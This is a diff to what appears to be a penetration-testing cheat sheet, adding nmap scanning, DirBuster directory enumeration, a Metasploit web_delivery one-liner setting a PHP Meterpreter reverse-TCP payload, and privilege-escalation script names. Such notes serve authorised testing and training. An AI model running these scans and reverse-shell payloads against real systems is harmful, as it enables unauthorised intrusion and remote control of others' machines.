@@ -10,20 +10,28 @@ hostname -I
 ME=$(hostname -I | xargs)
 ```
 
-### Network scan
+### Network scanning
+
+#### Nmap
+
+Examples:
 
 ```bash
+# Network scan
 nmap -sn "$ME/24"
-TARGET=192.168..
-```
+TARGET=192.168..#
 
-### Target scan
-
-```bash
+# Target scan
 nmap -A -p- $TARGET
 ```
 
-### Tools
+Resources:
+
+* `nmap`
+* https://tools.kali.org/information-gathering/nmap
+* https://nmap.org/book/man.html
+
+### Web server scanning
 
 #### Nikto2
 
@@ -73,6 +81,41 @@ Resources:
 * `wpscan --hh`
 * https://tools.kali.org/web-applications/wpscan
 * https://wpscan.org/
+
+### File/directory enumeration
+
+#### Wordlists
+
+```bash
+# collection in Kali
+/usr/share/wordlists/
+
+# Good results
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+
+
+```
+
+Resources:
+
+* https://tools.kali.org/password-attacks/wordlists
+* https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project#The_DirBuster_Lists
+* https://tools.kali.org/web-applications/dirb
+
+#### DirBuster
+
+Examples:
+
+```bash
+dirbuster -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$TARGET:80
+```
+
+Resources:
+
+* `dirbuster –h`
+* https://tools.kali.org/web-applications/dirbuster
+* https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
 
 
 
@@ -208,14 +251,18 @@ msfconsole
 > options
 > set target 1
 > set payload php/meterpreter/reverse_tcp
-> set lhost $KALI
+> set lhost $ME
 > set srvport 8080
 > exploit
+
+msfconsole -x "use exploit/multi/script/web_delivery; set target 1; set payload php/meterpreter/reverse_tcp; set lhost $ME; exploit"
+
+> sessions -i 1
 ```
 
 Resources:
 
-* Kali: `usr/share/webshells/`
+* Kali: `/usr/share/webshells/`
 
 ### Log poisoning
 
@@ -232,6 +279,12 @@ Goal: Reverse shell
 Resources:
 
 * https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
+
+### Privilege Escalation
+
+* `LinEnum.sh`
+* `linuxprivchecker.py`
+* `linuxprivchecker_python3.py`
 
 ## Binaries
 
